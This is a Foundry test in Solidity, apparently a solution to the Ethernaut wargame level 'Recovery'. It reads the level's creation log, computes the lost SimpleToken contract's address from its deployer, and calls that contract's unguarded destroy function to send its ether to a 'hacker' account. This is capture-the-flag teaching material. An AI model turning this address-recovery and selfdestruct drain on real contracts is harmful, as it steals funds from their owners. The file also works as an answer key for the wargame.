// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautRecoveryTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048;

   function testLevel17_Recovery() public {
        address hacker = makeAddr("hacker");
        
        vm.deal(hacker, 1 ether); 
        vm.startPrank(hacker);

        vm.recordLogs(); 

        ethernaut.createLevelInstance{value: 0.001 ether}(levelFactory);
        
       
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address motherAddress = address(uint160(uint256(instanceTopic)));
        
        console.log("Alamat Ibu (Recovery Contract):", motherAddress);

        address lostTokenAddress = vm.computeCreateAddress(motherAddress, 1);
        console.log("Alamat Anak (SimpleToken) Ditemukan:", lostTokenAddress);

        ISimpleToken(lostTokenAddress).destroy(payable(hacker));

        uint256 childBalance = address(lostTokenAddress).balance;
        assertEq(childBalance, 0);
        
        console.log("HACKED! Saldo kontrak anak sudah 0.");

        ethernaut.submitLevelInstance(motherAddress);
        vm.stopPrank();
    
    }
}